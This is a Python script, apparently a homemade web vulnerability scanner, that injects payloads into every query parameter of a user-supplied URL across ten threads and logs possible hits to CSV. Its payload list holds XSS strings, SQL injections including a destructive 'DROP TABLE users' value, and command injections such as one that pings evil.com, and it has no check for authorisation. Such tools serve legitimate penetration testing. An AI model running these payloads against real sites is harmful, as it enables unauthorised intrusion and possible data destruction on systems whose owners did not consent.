import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import re
import csv
import threading
from queue import Queue
from datetime import datetime

# Expanded payloads
payloads = {
    "xss": ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>", "'><svg/onload=alert(1)>"],
    "sqli": ["' OR 1=1--", "'; DROP TABLE users;", "' UNION SELECT NULL, NULL --"],
    "cmd": ["; uname -a", "| whoami", "& ping -c 1 evil.com"],
    "redirect": ["https://evil.com", "//evil.com", "/\\evil.com"]
}

headers_to_check = ["Location", "Content-Location", "Refresh"]
results = []
lock = threading.Lock()

def build_urls(base_url, param, test_type, payload_list):
    parsed = urlparse(base_url)
    params = parse_qs(parsed.query)
    urls = []

    for payload in payload_list:
        new_params = params.copy()
        new_params[param] = [payload]
        encoded = urlencode(new_params, doseq=True)
        new_url = urlunparse(parsed._replace(query=encoded))
        urls.append((param, test_type, payload, new_url))
    return urls

def test_url(param, test_type, payload, url):
    try:
        res = requests.get(url, timeout=5, allow_redirects=True)
        body = res.text.lower()
        status = "SAFE"

        if test_type == "xss" and payload.lower() in body:
            status = "POSSIBLE (payload reflected)"
        elif test_type == "sqli" and re.search(r"(sql|syntax|database|mysql|error|query)", body):
            status = "POSSIBLE (SQL error detected)"
        elif test_type == "cmd" and re.search(r"(linux|unix|kernel|ubuntu|root|user)", body):
            status = "POSSIBLE (cmd output)"
        elif test_type == "redirect":
            for h in headers_to_check:
                if h in res.headers and any(p in res.headers[h].lower() for p in ["evil.com", "http"]):
                    status = f"POSSIBLE (redirect via {h})"

        with lock:
            results.append({
                "parameter": param,
                "test_type": test_type,
                "payload": payload,
                "status": status,
                "url": url
            })
    except Exception as e:
        with lock:
            results.append({
                "parameter": param,
                "test_type": test_type,
                "payload": payload,
                "status": f"ERROR: {str(e)}",
                "url": url
            })

def worker(queue):
    while not queue.empty():
        param, test_type, payload, url = queue.get()
        test_url(param, test_type, payload, url)
        queue.task_done()

def run_recon(base_url):
    parsed = urlparse(base_url)
    params = parse_qs(parsed.query)
    queue = Queue()

    for param in params:
        for test_type, payload_list in payloads.items():
            for item in build_urls(base_url, param, test_type, payload_list):
                queue.put(item)

    threads = []
    for _ in range(10):  # 10 threads
        t = threading.Thread(target=worker, args=(queue,))
        t.daemon = True
        t.start()
        threads.append(t)

    queue.join()

def run_endpoint_recon():
    print("Running endpoint recon...")
    base_url = input("Enter a URL to scan: ").strip()
    run_recon(base_url)

def save_results_to_csv(filename="recon_results.csv"):
    with open(filename, mode='w', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=["parameter", "test_type", "payload", "status", "url"])
        writer.writeheader()
        writer.writerows(results)
    print(f"Results saved to {filename}")

def main():
    url = input("Enter the full URL with parameters: ").strip()
    print("Running recon, please wait...")
    run_recon(url)
    for r in results:
        print(f"[{r['test_type'].upper()}] Param: {r['parameter']} | Status: {r['status']}")

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    save_results_to_csv(f"recon_results_{ts}.csv")

if __name__ == "__main__":
    main()

